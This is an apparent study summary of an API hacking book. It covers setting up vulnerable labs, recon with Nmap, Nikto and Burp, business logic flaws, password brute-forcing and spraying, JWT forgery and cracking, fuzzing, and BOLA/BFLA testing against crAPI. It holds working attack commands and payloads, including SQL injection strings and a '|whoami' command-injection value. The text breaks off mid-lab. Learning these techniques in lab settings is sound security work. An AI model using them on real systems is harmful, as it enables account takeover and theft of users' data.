By **Dolev Farhi** and **Connor McKinnon**. GraphQL is growing fast (Facebook, Netflix, AWS, IBM use it), and its **GraphiQL IDE** is often left exposed.

```bash
sudo docker pull dolevf/dvga
sudo docker run -t -p 5000:5000 -e WEB_HOST=0.0.0.0 dolevf/dvga
```

➡️ Browse to `http://localhost:5000`

---

## ➕ 4. Other Vulnerable Apps (optional extras)

|Name|Contributor|GitHub|
|---|---|---|
|VAmPI|Erev0s|erev0s/VAmPI|
|DVWS-node|Snoopysecurity|snoopysecurity/dvws-node|
|DamnVulnerableMicroServices|ne0z|ne0z/DamnVulnerableMicroServices|
|Node-API-goat|Layro01|layro01/node-api-goat|
|Vulnerable GraphQL API|AidanNoll|CarveSystems/vulnerable-graphql-api|
|Generic-University|InsiderPhD|InsiderPhD/GenericUniversity|
|vulnapi|tkisason|tkisason/vulnapi|

---

## 🏴 5. TryHackMe & HackTheBox

|Platform|Notes|
|---|---|
|🆓 **TryHackMe**|Free + paid content. Browser-based attack box ("Start Attack Box") — great for beginners. API-related rooms: **Bookstore** (free), **Carpe Diem 1** (free), **ZTH: Obscure Web Vulns** (paid), **ZTH: Web2** (paid), **GraphQL** (paid)|
|🎯 **HackTheBox (HTB)**|Assumes existing skills; **no attack box provided** — bring your own. Free tier = 20 most recent machines. Need **VIP** for retired machines with API content|

### 🗃️ HTB Retired Machines (API-focused)

```
Craft          Postman        Smasher2
JSON           Node           Help
PlayerTwo      Luke           Playing with Dirty Socks
```

💡 Also check out standalone challenges like **Fuzzy**.

---

## 🧪 Lab #2: Finding Your Vulnerable APIs

**Goal:** discover and interact with the Juice Shop lab app using **Netdiscover, Nmap, Nikto, Burp Suite**.

### 🪜 Steps

**1️⃣ Find the host on the network**

```bash
sudo netdiscover
```

```
192.168.195.132   00:0c:29:85:40:c0   2   120   VMware, Inc.
```

➡️ Note the new IP that appears once the lab VM is running. **CTRL+C** to stop.

**2️⃣ Basic Nmap scan**

```bash
nmap 192.168.195.132
```

```
PORT     STATE SERVICE
3000/tcp open  ppp
```

**3️⃣ Detailed scan (scripts + version detection)**

```bash
nmap -sC -sV 192.168.195.132
```

```
3000/tcp open  ppp?
| GetRequest: HTTP/1.1 200 OK ... OWASP Juice Shop
```

➡️ Confirms **OWASP Juice Shop** running on port 3000 over HTTP.

**4️⃣ Browse it**

```
http://192.168.195.132:3000
```

Click around, watch URLs for signs of API activity.

**5️⃣ Nikto scan**

```bash
nikto -h http://192.168.195.132:3000
```

Findings:

- ⚠️ Missing `X-XSS-Protection` header
- 🏷️ Uncommon `feature-policy` header (`payment 'self'`)
- 📄 `robots.txt` → entry `/ftp/` returns `200` (worth checking manually)
- ❌ No CGI directories found
- ❌ Still **no direct sign of an API**

**6️⃣ Proxy traffic through Burp Suite**

1. FoxyProxy → select **Hackz** → Burp **Intercept ON**
2. Refresh the Juice Shop page
3. Click **Forward** repeatedly, watch requests build the page

➡️ Eventually reveals real API endpoints:

```
GET /rest/admin/application-configuration
GET /api/Challenges/?name=Score%20Board
GET /api/Quantitys/
```

### ✅ Takeaway

Nmap and Nikto found the **web app**, but only **intercepting traffic with Burp** revealed the **actual API endpoints** working behind the GUI.

---

## ✅ Quick Summary

```
🖥️ Host       → isolated Ubuntu VM/cloud, one app per host
🐳 Docker      → docker run hello-world to verify, docker-compose for multi-container
🚗 crAPI       → main lab target, OWASP API Top 10, shop+chat+MailHog
🥧 Pixi        → MEAN stack, social + payments, port 8000
🧃 Juice Shop  → Node/Express/Angular REST API, port 80, scoreboard
🔮 DVGA        → GraphQL target, GraphiQL IDE, port 5000
🏴 THM / HTB   → extra practice: THM = browser attack box, HTB = BYO attacker
🧪 Lab 2       → netdiscover → nmap → nikto → Burp intercept to find hidden API calls
```

> 🔑 **Key idea:** surface scanners (Nmap, Nikto) find the **web app**; only **traffic interception** (Burp Suite) reveals the **hidden API calls** powering it.

# ⚡Chapter 7: Endpoint Analysis — Summary

This chapter details how to interact with, map, analyze, and test API endpoints for early security wins, data disclosures, and misconfigurations.

## 1. 🔍 Finding Request Information

To effectively target APIs, you must uncover endpoint structures, parameters, headers, and authentication logic.

### 📚 API Documentation

- **Directory Paths:** Look in standard directories (`/docs`, `/api/docs`, `https://docs.example.com`, etc.).
    
- **Discovery Strategies:**
    
    1. 🔑 Authenticate to find restricted docs.
        
    2. 🔨 Directory brute-forcing using API-specific wordlists.
        
    3. 🔎 Google Hacking / Dorks.
        
    4. 🏛️ **Wayback Machine:** Uncover historical/deprecated documentation.
        
    5. 🎭 Social engineering / developer outreach.
        
- **💡 Golden Rule:** _Distrust and verify._ API documentation is frequently outdated or incomplete. Always test for undocumented endpoints, parameters, and HTTP methods.
    

### 📖 Common Documentation Conventions

|Notation|Example|Meaning|
|---|---|---|
|`:` or `{}`|`/user/:id` or `/user/{id}`|Path variable|
|`[]`|`/api/v1/user?find=[name]`|Optional parameter|
|`||`|
|`< >`|`<findfunction>`|DomString (16-bit string)|

### 📄 Importing API Specifications

- Formats like **OpenAPI (Swagger)**, **RAML**, or **API Blueprint** can be directly imported into Postman via URL/link or file.
    
- 🚀 Automatically populates endpoints, parameters, and headers.
    
- ⚙️ Configure **Collection Variables** (e.g., `{{baseUrl}}`, `{{hapi_token}}`) for streamlined workflow management.
    

## 2. 🛠️ Reverse Engineering APIs

When documentation or specifications are missing, reverse engineer the API to map endpoints.

### 🎯 Methods

1. **✍️ Manual Construction:** Manually create requests in Postman as they are discovered.
    
2. **🌐 Proxying Web Traffic:**
    
    - Configure FoxyProxy to pass browser traffic through Postman's built-in proxy (e.g., port `5555`).
        
    - Perform all web app actions (registration, login, profile updates, forum posts, checkout).
        
    - Clean up and organize captured requests into collection folders.
        
3. **🏃 Kiterunner Integration:** Pass active authorization tokens (`-H 'x-access-token: <TOKEN>'`) during scans to discover protected endpoints.
    

## 3. 🧪 Analyzing API Functionality

Analyze responses, status codes, and error messages while executing regular and privileged API workflows.

### 🔄 Workflow

- **🔁 Proxying Replays:** Route Kiterunner replay requests through Burp Suite using `--proxy=http://127.0.0.1:8080` for deeper analysis.
    
- **🎯 Intended Use Testing:** Send valid requests using Postman to establish baseline behaviors.
    
- **🛡️ Testing Privileged Actions:**
    
    - Identify admin endpoints from docs or scans.
        
    - Test access sequentially:
        
        1. 👤 Unauthenticated user
            
        2. 👥 Low-privileged user
            
        3. 👑 Administrative user
            

## 4. 🏆 Early Wins & Vulnerability Identification

### 🔓 Information Disclosures

- Revealing response headers (e.g., `X-Powered-By`).
    
- Differential status codes (e.g., `404 Not Found` vs. `401 Unauthorized`) that allow enumeration of usernames, phone numbers, or account IDs.
    

### ⚠️ Security Misconfigurations

- **💬 Verbose Error Messages:** Statements like `"User does not exist"` vs. `"Invalid password"` enable user enumeration.
    
- **🔓 Poor Transit Encryption:** Insecure HTTP usage or plaintext token transmission across unencrypted pathways (detectable via Wireshark 🦈).
    
- **🐛 Debugging Pages:** Enabled framework debug modes (e.g., Django stack traces) exposing backend routes, framework versions, and environment data.
    

### 📦 Excessive Data Exposures

- Backend API responses returning full database objects, relying on front-end client components to filter out sensitive fields.
    
- Can be analyzed efficiently at scale using tools like **Postman Collection Runner** 🏎️.

# 🧠 Business Logic Flaws and the crAPI Lab: Simple Summary

## 🔍 Part 1: Finding Business Logic Flaws

### What are they?

Business logic flaws are mistakes in **how an app is designed to work**, not bugs in the code itself. 🧩

- Every business is different, so every flaw is different.
- You usually don't need special tools. The flaw is a **normal feature** that can be misused. 🎭
- The idea: **turn the API's features against the API provider**.

### 💡 Main tip

> Read the API documentation. If it says **"don't do X"**, then **do X**! 😈

### 📋 Examples

|📖 What the docs say|🧪 What you should test|⚠️ Possible result|
|---|---|---|
|"Don't do action X"|Do action X anyway|Unexpected access or behavior|
|"Data in this format is not validated"|Upload a malicious payload (like a reverse shell) and try to run it|Remote code execution 💥|
|"No file size limit" + no rate limiting|Upload very large files again and again|Denial of service 🚫|
|"All file formats are accepted"|Upload many file extensions (use the `file-ext` wordlist) and try to run them|Executable files on the server 🐚|

### 🛠️ Real-life style examples

- 🛒 **Shop API:** the docs say "the price field is not checked". You send `"price": 0.01` for a $1000 item.
- 🎟️ **Coupon API:** "a coupon can be used once". You send the same coupon 50 times in parallel.
- 🏦 **Bank API:** "transfers can't be negative". You try `"amount": -100` and money goes the wrong way.

### 🧢 Mindset

Put on your **"evil genius cap"**: look at each feature and ask, _"How could a bad person use this to their advantage?"_ 😎

---

## 🧪 Part 2: Lab #4, Building a crAPI Collection and Finding Excessive Data Exposure

**Goal:** go from using a web app in the browser 🌐 to analyzing its API endpoints 🔧, and find a serious vulnerability.

### 🪜 Steps

1. **📝 Register an account** in the crAPI web app (all fields are required, and the password must be complex).
2. **🕵️ Proxy the traffic with Burp Suite** to see what happens behind the scenes.
    - Signup sends: `POST /identity/api/auth/signup` with a JSON body containing your form answers.
3. **📬 Rebuild the request in Postman** and add it to a new collection.
    - Method: `POST`, endpoint: `/identity/api/auth/signup`, body: JSON.
4. **🧯 Troubleshoot if needed:**
    - `415 Unsupported Media Type` ➜ set the header `Content-Type: application/json`.
    - Email or phone number already used ➜ change those values in the body.
    - ✅ `200 OK` means it works. Save the request!
5. **🔑 Log in and capture the Bearer token.**
    - Save it in the Postman collection as an **Authorization** setting (type: Bearer Token) or as a variable.
    - You need it for all future authenticated requests.
6. **🧭 Explore the app** (dashboard, shop, community) and save every request you find to the collection.
7. **💬 Check the community forum.** It involves other users, which makes it interesting.
    - Post a comment (this creates a `POST` request) and save it.
    - Then send a request to `/community/api/v2/community/posts/recent`.

### 🚨 The finding: Excessive Data Exposure

The response doesn't only return **your** post. It returns **every post**, with far too much information.

**Example of what leaks (simplified):**

```json
{
  "title": "Title 3",
  "content": "Hello world 3",
  "author": {
    "nickname": "Robot",
    "email": "robot001@example.com",
    "vehicleid": "76442a32-f32f-4d7d-ae05-3e8c995f68ce"
  },
  "authorid": 3
}
```

|🔓 Leaked data|😬 Why it's a problem|
|---|---|
|📧 Email addresses|Phishing, spam, account targeting|
|🆔 User IDs|Can be used to test other attacks (like BOLA/IDOR)|
|🚗 Vehicle IDs|Can be used to reach other users' private vehicle data|

The forum only needs to show a nickname and the post. 🙅 Everything else should stay hidden.

---

## 🎯 Key takeaways

1. 📖 **Read the docs carefully.** Warnings like "don't do this" are hints about where to test.
2. 🔄 **Use the API as intended first**, then look at the responses for data that shouldn't be there.
3. 🧰 **Build a collection** in Postman: save every request and the auth token.
4. 🕵️ **Look at the full response**, not only what the app shows on screen.
5. 🧠 **Think like an attacker**: normal features can become vulnerabilities.
6. 🔐 _Next step in the book:_ attacking the API's **authentication** mechanisms.
# 🔐 Attacking Authentication: Simple Summary

## 🎯 Big picture

Authentication is usually an API's **first line of defense**. 🛡️ If you break it, you get unauthorized access, and that access becomes a foothold for bigger attacks.

Common weak spots in APIs:

- ❌ No authentication at all
- 🚫 No rate limiting on login attempts
- 🔑 One single token/key used for everything
- 🎲 Tokens with weak randomness (predictable)
- 🪙 JWT (JSON Web Token) misconfigurations

---
## 🧱 Part 1: Classic Authentication Attacks

### 1️⃣ Password Brute-Force 💥

Just keep trying passwords against the login endpoint until one works.

- The payload is usually JSON, sometimes base64-encoded.
- Tool example: **Wfuzz**

```bash
wfuzz -d '{"email":"a@email.com","password":"FUZZ"}' \
  --hc 405 -H 'Content-Type: application/json' \
  -z file,rockyou.txt \
  http://target/api/v2/auth
```

🔎 Example result: password `"Password1!"` returns **200 OK** → found it! ✅

💡 Tip: use leaked data (like the forum leak from the previous lab 📬) to build a **targeted** password list instead of a huge generic one.

### 2️⃣ Password Reset / MFA (OTP) Brute-Force 📱

Password reset often uses a 4–6 digit OTP code. If there's no rate limiting, you can brute-force it.

```json
{
  "email": "a@email.com",
  "otp": "1234",
  "password": "Newpassword"
}
```

🛠️ In Burp Suite: mark the OTP as a variable, set payload type to **brute forcer**, character set = digits 0–9, length 4.

### 3️⃣ Password Spraying 🚿

Instead of trying **many passwords on one account**, try a **few common passwords on many accounts**. This avoids lockouts (e.g. a 10-attempt limit).

Example mini wordlist for "Twitter employees" 🐦:

```
Winter2021!
Password1!
Twitter@2022
Dorsey@2021
```

📊 In Burp Intruder: use **cluster bomb** attack type with 2 lists (usernames + passwords).

✅ Look for anomalies: a `200 OK` response with a different length than the usual failed response is a strong sign of success. 🚩

### 4️⃣ Base64-Encoded Credentials 🔡

Some APIs base64-encode the login payload. This is **not security**, just encoding — easy to bypass.

- Decode with Burp Decoder (`Ctrl+Shift+B`) to see the real format.
- Add a **payload-processing rule**: Base64-encode each password before sending it, so your brute-force/spray attack still works.

---

## 🪙 Part 2: Forging Tokens

If tokens are generated in a **predictable** way, you can guess or forge new ones. 🧬

### 🔬 Analyzing tokens with Burp Sequencer

- **Manual load:** paste a list of captured tokens (100+ needed for basic analysis).
- **Live capture:** Burp auto-generates up to 20,000 tokens from the provider and analyzes them.

📈 Sequencer tells you:

- How random (entropy) the tokens are 🎲
- Which **character positions** change and which stay the same

### 🎯 Example: predictable token

Token: `Ab4dt0k3n` + 3 changing characters (`letter + letter + number`)

Since only the last 3 characters change, you only need to brute-force those! 🧩

```bash
wfuzz -u target.com/api/v2/user/dashboard --hc 404 \
  -H "token: Ab4dt0k3nFUZZFUZ2ZFUZ3Z" \
  -z list,a-b-c-d -z list,a-b-c-d -z range,0-9
```

✅ Result: valid token found → `Ab4dt0k3nca1` (status 200) 🎉

Once you have valid tokens, test them against saved Postman requests (use **Postman Runner**) to see what access they give you. 🏃

---

## 🧾 Part 3: JSON Web Token (JWT) Abuse

A JWT has **3 parts** separated by dots: `header.payload.signature` 🧱

```
eyJhbGciOiJIUzI1NiIs...  .  eyJpc3MiOiJoYWNrYXB...  .  1c514f49...
      HEADER                      PAYLOAD                SIGNATURE
```

- **Header** 🏷️ → algorithm used (e.g. `HS256`, `RS256`, or `none`)
- **Payload** 📦 → data like username, user ID, role, expiration
- **Signature** ✍️ → proves the token wasn't tampered with (needs a secret key)

🔧 Tools: [jwt.io](https://jwt.io/) 🌐 and **JWT_Tool** 🧰 (command line)

### 🅰️ Attack #1: The "None" Algorithm Attack 😈

If the header says `"alg": "none"`, there's **no signature needed at all**!

1. Decode the token.
2. Edit the payload, e.g. change username to `"admin"`:

```json
{ "username": "admin", "iat": 1516239022 }
```

3. Re-encode it in base64.
4. **Delete everything after the last dot** (no signature needed).
5. Send it → instant admin access, if the API is vulnerable. 👑

### 🅱️ Attack #2: Algorithm Switch Attack 🔄

Sometimes the API accepts **more than one algorithm**.

- Try sending the token with **no signature** at all (just leave the trailing dot).
- Try changing `"alg": "RS256"` to `"alg": "none"`.
- **Key confusion trick:** if the API uses `RS256` (needs public + private key) but you trick it into accepting `HS256` (needs only ONE key), you can use the provider's own **public key** as the secret to forge a valid signature! 🗝️

```bash
jwt_tool <JWT_Token> -X k -pk public-key.pem
```

### 🅲️ Attack #3: JWT Crack Attack (Offline) 🔓

Try to **crack the secret key** used to sign the token, using a wordlist. This happens **offline**, so it's quiet — no requests sent to the server. 🤫

```bash
jwt_tool <JWT_Token> -C -d wordlist.txt
```

Once you know the secret, you can **forge any token you want** — including tokens for other users! 🎭

---

## 🧪 Part 4: Lab #5, Cracking the crAPI JWT

**Goal:** steal another user's identity by cracking their JWT secret. 🕵️

### 🪜 Steps

1. 🔑 Log in to crAPI and capture the JWT via Burp Suite.
    
2. 🔍 Inspect it on [jwt.io](https://jwt.io/): algorithm = `HS512` 💪 (strong), payload has `sub` (email), `iat`, `exp`.
    
3. ❌ "None" attack won't help here — algorithm is fixed and symmetric, so no algorithm-switch trick either.
    
4. 🔨 Try **JWT Crack attack**:
    
    - First attempt with `rockyou.txt` → tested 14+ million passwords → ❌ not found.
    - Build a **custom wordlist** (`crapi.txt`) with guesses like `Crapi2020`, `Jwt2022`, `owasp`, `crapi`... 💡
    - Run it again:
    
    ```bash
    jwt_tool <token> -C -d crapi.txt
    ```
    
    - 🎉 Result: `crapi is the CORRECT key!`
5. 🎭 **Forge a token for another user** (the "robot" account found in the previous forum leak):
    
    - Go to jwt.io.
    - Set algorithm `HS512`.
    - Put the robot's email in the payload.
    - Sign it using secret `"crapi"`.
6. 📤 Send the forged token in a request (Postman or Burp Repeater).
    
7. ✅ Success → you're now logged in **as the robot account**. Account takeover! 🤖🔓
    

---

## 🎯 Key takeaways

|🧩 Attack|⚙️ When it works|
|---|---|
|🧨 Brute-force|No rate limiting on login|
|📲 OTP brute-force|Weak/short OTP, no rate limiting|
|🚿 Password spraying|Lockout counts per account, not per IP|
|🔡 Base64 bypass|Encoding mistaken for security|
|🎲 Token brute-force|Low entropy / predictable tokens|
|😈 JWT "none" attack|Algorithm not enforced server-side|
|🔄 JWT algorithm switch|API accepts multiple algorithms (RS256 ↔ HS256)|
|🔓 JWT crack|Weak/guessable signing secret|

➡️ **Next chapter in the book:** moving from stolen access to attacking **authorization** (what a user is _allowed_ to do). 🚪
# 🌀 Fuzzing APIs

## 🎯 What is fuzzing?

Fuzzing = sending **weird or unexpected input** to an API endpoint to make it break or reveal something it shouldn't. 💥

Input examples: symbols 🔣, big numbers 🔢, emojis 😀, SQL code, system commands, foreign characters, null bytes...

🎯 The secret to success: knowing **where** to fuzz and **what** to fuzz with.

### 🏦 Example target

```json
POST /account/balance/transfer
{
  "userid": 12345,
  "account": 224466,
  "transfer-amount": 1337.25
}
```

A bank won't expect a transfer of a **quadrillion dollars** 💰 or a **negative number**. Try sending:

- A huge number (like 999999999999999999)
- Letters instead of numbers
- Null values: `null`, `%00`, `0x00`
- Symbols: `!@#$%^&*();':''|,./?>`

⚠️ Careful: too much fuzzing fast can trigger rate limiting or get your token blocked. If there's no protection... go wild! 🌊

---

## 🎨 Part 1: Choosing Fuzzing Payloads

|Type|What it is|Example|
|---|---|---|
|🧪 **Generic**|Random symbols, big numbers, long strings|`AAAA...A`, `%00`, `' OR 1=1-- -`|
|🎯 **Targeted**|Made for a specific tech (SQL, NoSQL, XSS, file extensions...)|`$ne`, `<script>`, `|

📚 Good payload sources:

- **SecLists** (`big-list-of-naughty-strings.txt`) 📜
- **fuzzdb** project 🗂️
- **Wfuzz's All_attack.txt** 🧰

📝 You can also build your own simple list:

```
9999999999999999999999999999999999999999
' OR 1=1-- -
$ne
|whoami
😀 😃 😄
```

---

## 🔍 Part 2: Detecting Anomalies

Normal response (good input handling) 👍:

```
HTTP/1.1 400 Bad Request
{ "error": "number required" }
```

Bad response (broken input handling) 🚨:

```
HTTP/1.1 200 OK
SQL Error: There is an error in your SQL syntax.
```

➡️ This tells you: it uses a **SQL database**, and it's **not handling input safely**! 🎯

### 📊 Finding a baseline

Send normal requests (or requests you expect to fail) first, see what the "usual" response looks like (status code + size). Then compare it to your fuzzing results.

🛠️ **Burp Suite Comparer**: send 2+ responses to Comparer, click "Compare Words" to see exact differences side-by-side. Great for spotting _tiny_ changes. 🔬

---

## 🧭 Part 3: Fuzzing Wide vs Fuzzing Deep

|Style|Meaning|Best for|
|---|---|---|
|↔️ **Wide** (a mile wide, an inch deep)|Send the same payload across **all** requests in the API|Improper assets management, finding valid HTTP methods, token issues|
|⬇️ **Deep** (an inch wide, a mile deep)|Send **many payloads** into **one** request (headers, params, body)|BOLA, BFLA, injection, mass assignment (later chapters)|

### 🌊 Fuzzing Wide with Postman

1. Build a Postman environment with fuzzing variables like `{{fuzz1}}`. 🧩
2. Replace a header or field value with that variable, e.g. the `x-access-token` header.
3. Add a quick test:

```js
pm.test("Status code is 200", function () {
  pm.response.to.have.status(200);
});
```

4. Run the **Collection Runner** across every request. 🏃‍♂️
5. Compare results against your baseline (no fuzz value) to spot anomalies.

🔎 Example: sending `' OR 1=1-- -` made the Collection Runner pass 3 tests then suddenly stop → 🚩 something broke!

### 🔬 Fuzzing Deep with Burp Suite

Use **Intruder** to fuzz every field in one request.

```
PUT /api/user/edit_info
{
  "user": "§<email>§",
  "pass": "§<string>§",
  "id": "§<number>§",
  "is_admin": "§<boolean>§"
}
```

💡 Golden rule: **send the unexpected!**

- Email field? → send a number 🔢
- Number field? → send a string 🔤
- Boolean field? → send something weird 🎲

🎯 Example finding:

```
Payload: {}[]|\:";'<>?,./
Response: 400 - SyntaxError: Unexpected token in JSON at position 32
```

➡️ Interesting! Now try more JSON-breaking payloads around that one. 🧩

### ⚡ Fuzzing Deep with Wfuzz (faster, no rate limit)

```bash
wfuzz -z file,big-list-of-naughty-strings.txt \
  -H "Content-Type: application/json" \
  -H "x-access-token: [...]" \
  --hc 400 -X PUT \
  -d "{\"user\":\"FUZZ\",\"pass\":\"FUZZ\",\"id\":\"FUZZ\"}" \
  -u http://target/api/user/edit_info
```

Look for a response code that's different from the rest (like a `302` 🚩 when everything else is `200`).

---

## 🏚️ Part 4: Improper Assets Management

This happens when an organization still exposes **old, test, or dev versions** of its API. These versions often have **weaker security**. 🏚️

### 🕵️ How to find it

- Check **outdated documentation** and changelogs. A line like _"fixed BOLA bug in v3"_ 📝 is a strong hint that **v1/v2 still has that bug**!
- Try swapping the version in the base URL: `v1`, `v2`, `v3`, `test`, `mobile`, `uat`, `dev`, `old` 🔄
- Try hidden admin paths: `/api/v2/internal/users` 🔐

### 🧪 Example from crAPI lab

- Almost every endpoint uses `/v2`, except password reset which secretly uses `/v3`. 🤔
- Set up a test for `404 Not Found` as the baseline (fuzz an invalid path → should always fail).
- When swapping to `/v3` for ALL endpoints, something weird happens: the password reset request doesn't return 404 — it returns **500 Internal Server Error** instead! 🚨
- Comparing `/v2` vs `/v3` responses for password reset:
    - `/v3` → `{"message":"ERROR..","status":500}` (OTP attempt limit in place ✅)
    - `/v2` → `{"message":"Invalid OTP! Please try again..","status":500}` (**no limit** on OTP attempts! ❌)
- 🎉 **Found it:** the old `/v2` password reset endpoint has **no rate limiting** on the OTP code!
- With a 4-digit OTP, you can brute-force it in max **10,000 requests** 🔢 until you get:
    
    ```json
    {"message":"OTP verified","status":200}
    ```
    
    🏆 Victory!

---

## 🧭 Part 5: Testing HTTP Methods

Use fuzzing to find **all accepted methods** on an endpoint:

```bash
wfuzz -z list,GET-HEAD-POST-PUT-PATCH-TRACE-OPTIONS-CONNECT \
  -X FUZZ http://target/api/v2/account
```

Example result:

```
GET     → 200 ✅
HEAD    → 200 ✅
POST    → 405 ❌ (but wait, was POST documented?)
PUT     → 405
```

If `POST` works but wasn't in the docs → you may have found **undocumented functionality**. 🕳️ Always worth testing further!

---

## 🪜 Part 6: Bypassing Input Sanitization

Some fields (like email) reject almost everything that isn't a valid format. Trick: send a **valid-looking value + escape character + payload**.

```json
"user": "a@b.com%00§test§"
```

Or combine escape characters AND payloads with a **cluster bomb attack** in Burp Suite (tries every combination): 🧨

```
Escape1 + Payload1
Escape1 + Payload2
Escape2 + Payload1
Escape2 + Payload2
```

⚠️ Warning: the number of requests grows **fast** (exponentially) with this method!

---

## 🗂️ Part 7: Directory Traversal Fuzzing

Try payloads like `../`, `..\`, `\..\.\` to escape the API's folder and read files it shouldn't expose. 📂➡️🔓

If it works, you might access:

- Application source code 📜
- Usernames & passwords 🔑
- Personal data (names, emails, phone numbers) 📇

---

## 🎯 Key takeaways

1. 🧪 Fuzz = send weird input, watch for weird responses.
2. 🌊 **Fuzz wide** first (across the whole API) to spot big issues like old versions or missing auth.
3. ⬇️ **Fuzz deep** next (one request, many payloads) for injection, BOLA, BFLA, etc.
4. 📊 Always build a **baseline** before hunting for anomalies.
5. 🏚️ Old API versions (`v1`, `v2`, `test`, `dev`) often hide forgotten vulnerabilities.
6. 🔑 Don't forget to test **HTTP methods** and **input sanitization bypass** tricks.

➡️ **Next chapters:** using these fuzzing techniques to find specific bugs like BOLA, BFLA, injection, and mass assignment. 🚪
# 🔓 Exploiting Authorization (BOLA & BFLA)

> Both vulnerabilities expose weak **authorization checks**: the API confirms you're _authenticated_ but fails to confirm you're _authorized_ for the specific resource or action.

---
## 1️⃣ 🔍 Finding BOLAs

### 🧩 Basic pattern

```
/api/v1/receipt/135   → try 0–200 as payload (Burp Intruder / Wfuzz)
```

⚠️ **Don't limit yourself to GET requests** — test **all HTTP methods**, and check resource IDs in the **body and headers**, not just the URL path.

### 📍 Locating Resource IDs

Look for: user IDs, resource IDs, organization IDs, emails, phone numbers, addresses, tokens, encoded payloads.

⚠️ **Predictable IDs ≠ BOLA.** The API is only vulnerable if it **actually grants access** to a resource you shouldn't have.

### 📋 BOLA test patterns (all using the SAME UserA token)

|Type|Valid request|BOLA test|
|---|---|---|
|🔢 Predictable ID|`GET /api/v1/account/2222`|`GET /api/v1/account/3333`|
|🔗 ID combo|`GET /api/v1/UserA/data/2222`|`GET /api/v1/UserB/data/3333`|
|🔢 Integer as ID|`{"Account": 2222}`|`{"Account": [3333]}`|
|📧 Email as user ID|`{"email":"UserA@email.com"}`|`{"email":"UserB@email.com"}`|
|🏢 Group ID|`GET /api/v1/group/CompanyA`|`GET /api/v1/group/CompanyB`|
|🏢🔗 Group+user combo|`{"email":"userA@CompanyA.com"}`|`{"email":"userB@CompanyB.com"}`|
|📦 Nested object|`{"Account": 2222}`|`{"Account": {"Account":3333}}`|
|📦📦 Multiple objects|`{"Account": 2222}`|`{"Account":2222,"Account":3333,"Account":5555}`|
|🎫 Predictable token|`{"data":"DflK1df7jSdfa1acaa"}`|`{"data":"DflK1df7jSdfa2dfaa"}`|

💡 **Nested objects** can bypass validation applied only to the **outer** key/value pair — the inner pair may slip past the same security checks.

### 🅰️🅱️ A-B Testing for BOLA

1. **Create resources as UserA** → note how they're identified/requested
2. **Swap to UserB's token** (register a 2nd account if possible)
3. **Request UserA's resources with UserB's token** → focus on PII (name, email, phone, SSN, bank info, legal docs, transactions)

💡 Can access **one** user's data this way → likely can access **all** users at that privilege level.

**Variation (3 accounts):** create resources in 3 different accounts to detect **ID patterns** more reliably.

### 📡 Side-Channel BOLA

Info leaked through **indirect signals**: timing, status codes, response length — not the data itself.

|Request|Response|Meaning|
|---|---|---|
|`GET /api/user/test987123`|`404 Not Found`|Doesn't exist|
|`GET /api/user/hapihacker`|`405 Unauthorized`|**Exists!**|
|`GET /api/user/1337`|`405 Unauthorized`|**Exists!**|
|`GET /api/user/phone/2018675309`|`405 Unauthorized`|**Exists!**|

💡 Different response codes for existing vs. non-existing resources = **enumeration oracle**. Useful for brute-forcing valid accounts or feeding into other BOLA tests (e.g. ID combo).

---

## 2️⃣ 🧩 Finding BFLAs

Look for **functionality** you shouldn't have: update, delete, act as another user/role.

⚠️ **Careful with DELETE while fuzzing** — a successful DELETE is **destructive and irreversible**. Test on a small scale, ideally only in test environments.

### 🅰️🅱️🅰️ A-B-A Testing for BFLA

1. **Create/read/update/delete** resources as **UserA** → note identification & request format
2. **Swap to UserB's token** → send `GET`, `PUT`, `POST`, `DELETE` against **UserA's** resources
3. **Validate with UserA's token/account** → did the change actually happen? (e.g. is the profile picture really gone?)

💡 Test **across privilege levels** too (basic user, merchant, partner, admin). If UserA = admin and UserB = basic user succeeds in admin actions → it becomes a **privilege escalation** attack.

### 🧪 Testing for BFLA in Postman

**Step 1 — Confirm normal access:**

```http
GET /api/picture/2
Token: UserA_token
```

```json
{ "_id": 2, "username": "UserA", "likes": 0, ... }
```

**Step 2 — Try the forbidden action with the OTHER user's token:**

```http
DELETE /api/picture/2
Token: UserB_token
```

➡️ If UserA's picture gets deleted using **UserB's** token → **confirmed BFLA**. Validate with a follow-up `GET` (resource should be gone).

### 👑 Admin functionality example

```http
POST /api/admin/find/user
Token: LowPriv-Token
{"email": "hapi@hacker.com"}
```

```json
200 OK
{ "fname":"hAPI", "lname":"Hacker", "is_admin": false,
  "balance": "3737.50", "pin": 8675 }
```

➡️ A **low-privilege token** reaching an admin-only endpoint = **BFLA**, and it leaked sensitive data (balance, PIN) on top.

💡 If one method (e.g. `PUT`) is blocked, **try another** (`POST`) — providers sometimes secure one verb and forget the rest.

---

## 🚀 3. Authorization Hacking Tips (scaling up)

### 📮 Postman Collection Variables

1. Set the auth token as a **collection variable**
2. Confirm requests work as **UserA**
3. Swap the variable to **UserB's token**
4. Add a **Collection test** checking for `200` responses
5. Run via **Collection Runner**, review for unexpected successes

### 🦊 Burp Suite Match and Replace

1. Collect UserA's requests in Burp's history (focus on account/resource actions)
2. Use **Match and Replace** to swap the auth header → UserB's token
3. Replay requests, look for successes

💡 Once you find one instance of BOLA/BFLA, **try to exploit it across all users/resources**.

---

## 🧪 Lab #7: Finding Another User's Vehicle Location (crAPI)

**Goal:** chain a BOLA with a prior **excessive data exposure** finding to track any user's vehicle.

### 🪜 Steps

**1️⃣ Spot the target request**

```
GET /identity/api/v2/vehicle/{GUID}/location
```

GUID is too long/complex to brute-force → use **A-B testing** instead.

**2️⃣ Register UserB + a vehicle**

- Register a second account (UserB)
- Use **MailHog** (port 8025) to get the "Welcome to crAPI" email with VIN + pincode
- Register the vehicle via **Add a Vehicle**

**3️⃣ Capture UserB's "Refresh Location" request**

```http
GET /identity/api/v2/vehicle/d3b4b4b8-6df6-4134-8d32-1be402caf45c/location
Authorization: Bearer UserB-Token
```

**4️⃣ Swap in UserA's token (BOLA attempt)**

```http
GET /identity/api/v2/vehicle/d3b4b4b8-6df6-4134-8d32-1be402caf45c/location
Authorization: Bearer UserA-Token
```

```json
HTTP/1.1 200
{ "carId":"d3b4b4b8-...", "vehicleLocation":{"latitude":"39.0247621","longitude":"-77.1402267"}, "fullName":"UserB" }
```

✅ **BOLA confirmed** — UserA accessed UserB's vehicle location.

**5️⃣ Chain with earlier excessive data exposure (Ch. 7)** An earlier `/community/api/v2/community/posts/recent` leak exposed a `vehicleid` field for other users:

```json
{ "author": { "nickname":"Adam", "vehicleid":"2e88a86c-8b3b-4bd1-8117-85f3c8b52ed2" } }
```

**6️⃣ Use that leaked GUID with UserA's token**

```http
